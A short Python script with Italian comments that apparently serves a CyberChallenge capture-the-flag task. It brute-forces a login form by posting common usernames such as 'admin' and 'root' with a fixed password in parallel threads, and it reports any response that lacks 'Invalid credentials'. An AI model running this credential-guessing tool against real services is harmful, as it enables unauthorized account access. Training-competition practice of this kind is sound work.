import requests
from concurrent.futures import ThreadPoolExecutor

def try_login(username, password="test"):
    """
    Tenta il login con le credenziali fornite
    """
    url = "http://zipzap.challs.cyberchallenge.it"
    data = {
        "username": username,
        "password": password
    }
    
    try:
        response = requests.post(url, data=data)
        
        # Controlla se il login ha avuto successo
        # Potremmo dover modificare questa condizione in base alle risposte del server
        if "Invalid credentials" not in response.text:
            print(f"Possibile account trovato! Username: {username}")
            print(f"Risposta del server: {response.text[:200]}...")  # Mostra i primi 200 caratteri
            return True
        return False
    except Exception as e:
        print(f"Errore durante il tentativo con {username}: {str(e)}")
        return False

def main():
    # Lista di username comuni da testare
    usernames = [
        "admin", "administrator", "root", "user", "test", "guest",
        "system", "default", "operator", "supervisor", "manager",
        "cyberchallenge", "zipzap", "flag", "ctf", "challenge",
        # Aggiungi altri username che potrebbero essere rilevanti
    ]
    
    print("Iniziando il bruteforce degli username...")
    
    # Utilizzo di ThreadPoolExecutor per velocizzare il processo
    with ThreadPoolExecutor(max_workers=5) as executor:
        results = list(executor.map(try_login, usernames))
    
    if not any(results):
        print("\nNessun account valido trovato tra gli username testati.")
    
    print("\nBruteforce completato!")

if __name__ == "__main__":
    main() 